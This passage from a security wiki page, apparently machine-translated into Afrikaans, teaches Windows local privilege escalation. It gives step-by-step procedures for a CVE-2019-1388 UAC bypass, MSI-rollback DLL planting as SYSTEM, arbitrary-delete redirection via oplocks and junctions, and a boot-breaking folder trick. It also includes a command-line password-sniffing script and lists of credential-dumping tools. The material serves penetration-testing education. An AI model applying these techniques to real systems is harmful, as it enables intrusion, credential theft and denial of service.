Wanneer data deur 'n **client** deur 'n pipe gestuur word, het die **server** wat die pipe opgestel het die vermoë om die **identity** van die **client** aan te neem, mits dit die nodige **SeImpersonate** rights het. Om 'n **privileged process** wat via 'n pipe kommunikeer wat jy kan naboots, te identifiseer, bied die geleentheid om **gain higher privileges** deur die identiteit van daardie proses aan te neem sodra dit met die pipe wat jy opgestel het interaksie het. Vir instruksies oor die uitvoering van so 'n aanval, kan nuttige gidse gevind word [**hier**](named-pipe-client-impersonation.md) en [**hier**](#from-high-integrity-to-system).

Die volgende tool laat jou ook toe om **intercept a named pipe communication with a tool like burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **en hierdie tool laat toe om al die pipes te lys en te sien om privescs te vind** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Divers

### File Extensions that could execute stuff in Windows

Kyk na die bladsy **[https://filesec.io/](https://filesec.io/)**

### **Monitering van opdragreëls vir wagwoorde**

Wanneer jy 'n shell as 'n gebruiker kry, kan daar geskeduleerde take of ander prosesse wees wat uitgevoer word wat **pass credentials on the command line**. Die onderstaande skrip neem proses opdragreëls elke twee sekondes op en vergelyk die huidige toestand met die vorige, en gee enige verskille uit.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Wagwoorde uit prosesse steel

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

As jy toegang het tot die grafiese koppelvlak (via console of RDP) en UAC aangeskakel is, is dit in sommige weergawes van Microsoft Windows moontlik om 'n terminal of enige ander proses soos "NT\AUTHORITY SYSTEM" vanaf 'n onbevoorregte gebruiker te laat loop.

Dit maak dit moontlik om bevoegdhede te verhoog en terselfdertyd UAC met dieselfde kwesbaarheid te omseil. Daarbenewens is dit nie nodig om enigiets te installeer nie, en die binêre wat tydens die proses gebruik word, is deur Microsoft geteken en uitgereik.

Sommige van die aangetaste stelsels is die volgende:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Om hierdie kwesbaarheid te misbruik, is dit nodig om die volgende stappe uit te voer:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## Van Administrator Medium na High Integrity Level / UAC Bypass

Read this to **learn about Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Then **read this to learn about UAC and UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Van Arbitrary Folder Delete/Move/Rename na SYSTEM EoP

Die tegniek beskryf [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) met 'n exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Die aanval bestaan basies uit die misbruik van die Windows Installer se rollback-funksie om wettige lêers tydens die deïnstallasieproses met kwaadwillige lêers te vervang. Hiervoor moet die aanvaller 'n **kwaadwillige MSI installer** skep wat gebruik sal word om die `C:\Config.Msi`-gids te hijack, wat later deur die Windows Installer gebruik sal word om rollback-lêers te stoor tydens die deïnstallasie van ander MSI-pakkette, waar die rollback-lêers ge-"modified" sou wees om die kwaadwillige payload te bevat.

Die opgesomde tegniek is die volgende:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Stap 1: Installeer die MSI
- Skep 'n `.msi` wat 'n onskadelike lêer (bv. `dummy.txt`) in 'n skryfbare gids (`TARGETDIR`) installeer.
- Merk die installer as **"UAC Compliant"**, sodat 'n **nie-admin gebruiker** dit kan uitvoer.
- Hou 'n **handle** oop na die lêer ná installasie.

- Stap 2: Begin deïnstallasie
- Deïnstalleer dieselfde `.msi`.
- Die deïnstallasieproses begin lêers na `C:\Config.Msi` skuif en hernoem hulle na `.rbf`-lêers (rollback backups).
- **Poll die oop file handle** met behulp van `GetFinalPathNameByHandle` om te detecteer wanneer die lêer `C:\Config.Msi\<random>.rbf` word.

- Stap 3: Custom Syncing
- Die `.msi` sluit 'n **custom uninstall action (`SyncOnRbfWritten`)** in wat:
- Sein gee wanneer `.rbf` geskryf is.
- Dan **wag** op 'n ander event voordat die deïnstallasie voortgaan.

- Stap 4: Block Deletion of `.rbf`
- Wanneer daar seine is, **open die `.rbf` lêer** sonder `FILE_SHARE_DELETE` — dit **verhoed dat dit verwyder word**.
- Dan **seine terug** sodat die deïnstallasie kan voltooi.
- Windows Installer misluk om die `.rbf` te verwyder, en omdat dit nie alle inhoud kan verwyder nie, **word `C:\Config.Msi` nie verwyder nie**.

- Stap 5: Verwyder `.rbf` handmatig
- Jy (aanvaller) verwyder die `.rbf` lêer handmatig.
- Nou is **`C:\Config.Msi` leeg**, gereed om gehijack te word.

> Op hierdie punt, **trigger the SYSTEM-level arbitrary folder delete vulnerability** om `C:\Config.Msi` te verwyder.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Stap 6: Herstel `C:\Config.Msi` met swak ACLs
- Skep die `C:\Config.Msi`-gids self weer.
- Stel **swak DACLs** in (bv. Everyone:F), en **hou 'n handle oop** met `WRITE_DAC`.

- Stap 7: Voer nog 'n install uit
- Installeer die `.msi` weer, met:
- `TARGETDIR`: Skryfbare ligging.
- `ERROROUT`: 'n veranderlike wat 'n geforseerde mislukking veroorsaak.
- Hierdie install sal gebruik word om weer **rollback** te trigger, wat `.rbs` en `.rbf` lees.

- Stap 8: Monitor vir `.rbs`
- Gebruik `ReadDirectoryChangesW` om `C:\Config.Msi` te monitor totdat 'n nuwe `.rbs` verskyn.
- Vang sy lêernaam op.

- Stap 9: Sync voordat rollback
- Die `.msi` bevat 'n **custom install action (`SyncBeforeRollback`)** wat:
- 'n event seine wanneer die `.rbs` geskep is.
- Dan **wag** voordat dit voortgaan.

- Stap 10: Herpas swak ACL
- Nadat jy die `.rbs created` event ontvang het:
- Die Windows Installer **herpas sterk ACLs** op `C:\Config.Msi`.
- Maar aangesien jy steeds 'n handle met `WRITE_DAC` het, kan jy weer **swak ACLs herpas**.

> ACLs word **slegs gehandhaaf by handle open**, so jy kan steeds na die gids skryf.

- Stap 11: Drop fake `.rbs` en `.rbf`
- Oorskryf die `.rbs` lêer met 'n **fake rollback script** wat Windows vertel om:
- Jou `.rbf` lêer (kwaadwillige DLL) in 'n **privileged locatie** te herstel (bv. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Jou fake `.rbf` te drop wat 'n **kwaadwillige SYSTEM-level payload DLL** bevat.

- Stap 12: Trigger die Rollback
- Seine die sync event sodat die installer hervat.
- 'n **type 19 custom action (`ErrorOut`)** is gekonfigureer om die install op 'n bekende punt doelbewus te laat misluk.
- Dit veroorsaak dat **rollback begin**.

- Stap 13: SYSTEM installeer jou DLL
- Windows Installer:
- Lees jou kwaadwillige `.rbs`.
- Kopieer jou `.rbf` DLL na die teiken-ligging.
- Jy het nou jou **kwaadwillige DLL in 'n SYSTEM-loaded path**.

- Finale stap: Voer SYSTEM-kode uit
- Voer 'n vertroude **auto-elevated binary** uit (bv. `osk.exe`) wat die DLL laai wat jy gehijack het.
- **Boom**: Jou kode word uitgevoer **as SYSTEM**.


### Van Arbitrary File Delete/Move/Rename na SYSTEM EoP

Die hoof MSI rollback-tegniek (hierbo) gaan daarvan uit dat jy 'n **gehele gids** kan verwyder (bv. `C:\Config.Msi`). Maar wat as jou kwetsbaarheid slegs **arbitrary file deletion** toelaat?

Jy kan NTFS internals misbruik: elke gids het 'n versteekte alternate data stream genaamd:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Hierdie stroom stoor die **indeks metagegewens** van die gids.

Dus, as jy die **`::$INDEX_ALLOCATION` stroom verwyder** van 'n gids, verwyder NTFS **die hele gids** uit die lêerstelsel.

Jy kan dit doen met standaard lêerverwyderings-APIs soos:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Alhoewel jy 'n *file* delete API aanroep, **verwyder dit die vouer self**.

### From Folder Contents Delete to SYSTEM EoP
Wat as jou primitief jou nie toelaat om arbitrêre lêers/vouers te verwyder nie, maar dit **laat toe om die *inhoud* van 'n deur 'n aanvaller beheerde vouer te verwyder**?

1. Stap 1: Stel 'n lokmap en lêer op
- Create: `C:\temp\folder1`
- Inside it: `C:\temp\folder1\file1.txt`

2. Stap 2: Plaas 'n **oplock** op `file1.txt`
- Die oplock **pauzeer uitvoering** wanneer 'n geprivilegieerde proses probeer om `file1.txt` te verwyder.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Stap 3: Ontlok SYSTEM-proses (bv., `SilentCleanup`)
- Hierdie proses skandeer vouers (bv., `%TEMP%`) en probeer hul inhoud verwyder.
- Wanneer dit by `file1.txt` aankom, die **oplock aktiveer** en gee beheer aan jou callback.

4. Stap 4: Binne die oplock callback – herlei die verwydering

- Opsie A: Skuif `file1.txt` na elders
- Dit maak `folder1` leeg sonder die oplock te breek.
- Moet nie `file1.txt` direk verwyder nie — dit sal die oplock voortydig vrylaat.

- Opsie B: Omskep `folder1` in 'n **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Opsie C: Skep 'n **symlink** in `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Dit teiken die NTFS interne stroom wat vouermetadata stoor — deur dit te verwyder, word die vouer verwyder.

5. Stap 5: Vrylaat die oplock
- Die SYSTEM-proses gaan voort en probeer `file1.txt` verwyder.
- Maar nou, as gevolg van die junction + symlink, verwyder dit eintlik:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Resultaat**: `C:\Config.Msi` word deur SYSTEM verwyder.

### Van Arbitrary Folder Create na Permanente DoS

Exploit a primitive wat jou toelaat om **create an arbitrary folder as SYSTEM/admin** — selfs al **kan jy nie lêers skryf** of **swakke permissies stel**.

Skep 'n **vouer** (nie 'n lêer nie) met die naam van 'n **kritiese Windows driver**, byvoorbeeld:
```
C:\Windows\System32\cng.sys
```
- Hierdie pad stem gewoonlik ooreen met die `cng.sys` kernel-mode driver.
- As jy dit **vooraf as 'n gids skep**, misluk Windows om die werklike driver tydens opstart te laai.
- Dan probeer Windows `cng.sys` tydens opstart laai.
- Dit sien die gids, **slaag nie daarin om die werklike driver te vind nie**, en **stort of blokkeer die opstart**.
- Daar is **geen terugval** nie, en **geen herstel** sonder eksterne ingryping nie (bv. opstartherstel of skyftoegang).


## **Van High Integrity na SYSTEM**

### **Nuwe diens**

As jy reeds op 'n High Integrity-proses loop, kan die **pad na SYSTEM** maklik wees net deur 'n **nuwe diens te skep en uit te voer**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Wanneer jy 'n service binary skep, maak seker dit is 'n geldige service of dat die binary die nodige aksies vinnig uitvoer, anders sal dit binne 20s gestop word as dit nie 'n geldige service is nie.

### AlwaysInstallElevated

Vanaf 'n High Integrity proses kan jy probeer om die **AlwaysInstallElevated registry entries te aktiveer** en 'n reverse shell te **installeer** met 'n _**.msi**_ wrapper.\  
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Jy kan** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

As jy daardie token privileges het (waarskynlik sal jy dit in 'n reeds High Integrity proses vind), sal jy in staat wees om **byna enige proses oop te maak** (nie-protected processes nie) met die SeDebug privilege, die **token van die proses te kopieer**, en 'n **arbitrêre proses met daardie token te skep**.\
Gebruik van hierdie tegniek kies gewoonlik **'n proses wat as SYSTEM loop met al die token privileges** (_ja, jy kan SYSTEM prosesse vind sonder al die token privileges_).\
**Jy kan** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Hierdie tegniek word deur meterpreter gebruik om te escalate in `getsystem`. Die tegniek bestaan uit **die skep van 'n pipe en dan 'n service skep/misbruik om op daardie pipe te skryf**. Daarna sal die **server** wat die pipe geskep het, met die **`SeImpersonate`** privilege in staat wees om die **token van die pipe client** (die service) te impersonate en sodoende SYSTEM privileges te verkry.\
As jy [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
As jy 'n voorbeeld wil sien van [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

As jy daarin slaag om 'n **dll te hijack** wat deur 'n **proses** wat as **SYSTEM** loop gelaai word, sal jy arbitêre kode met daardie regte kan uitvoer. Daarom is Dll Hijacking ook nuttig vir hierdie tipe privilege escalation, en boonop is dit baie **makkelijker om vanaf 'n high integrity process te bereik** aangesien dit **write permissions** op die vouers het wat gebruik word om dlls te laai.\  
**Jy kan** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Beste hulpmiddel om na Windows local privilege escalation vectors te soek:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Soek na miskonfigurasies en sensitiewe lêers (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Gedetecteer.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Soek na moontlike miskonfigurasies en versamel inligting (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Soek na miskonfigurasies**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Ekstraheer PuTTY, WinSCP, SuperPuTTY, FileZilla en RDP gespeelde sessie-inligting. Gebruik -Thorough lokaal.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Ekstraheer credentials vanaf Credential Manager. Gedetecteer.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray versamelde wagwoorde oor die domein**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh is 'n PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer en man-in-the-middle hulpmiddel.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basiese privesc Windows enumerasie**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Soek na bekende privesc kwesbaarhede (VEROONDEERD vir Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokale kontroles **(Behoefte aan Admin regte)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Soek na bekende privesc kwesbaarhede (moet saamgestel word met VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enu­me­reer die gasheer en soek na miskonfigurasies (meer 'n inligtingsversameling hulpmiddel as privesc) (moet saamgestel word) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Ekstraheer credentials uit baie sagteware (precompiled exe op github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port van PowerUp na C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Soek na miskonfigurasies (precompiled executable op github). Nie aanbeveel nie. Werk nie goed op Win10 nie.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Soek na moontlike miskonfigurasies (exe vanaf python). Nie aanbeveel nie. Werk nie goed op Win10 nie.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Hulpmiddel geskep gebaseer op hierdie post (dit benodig nie accesschk om behoorlik te werk nie maar kan dit gebruik).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Lees die uitset van **systeminfo** en beveel werkende exploits aan (lokaal python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Lees die uitset van **systeminfo** en beveel werkende exploits aan (lokaal python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Jy moet die projek saamstel met die korrekte weergawe van .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Om die geïnstalleerde weergawe van .NET op die slagoffer-host te sien kan jy doen:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Verwysings

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)

{{#include ../../banners/hacktricks-training.md}}
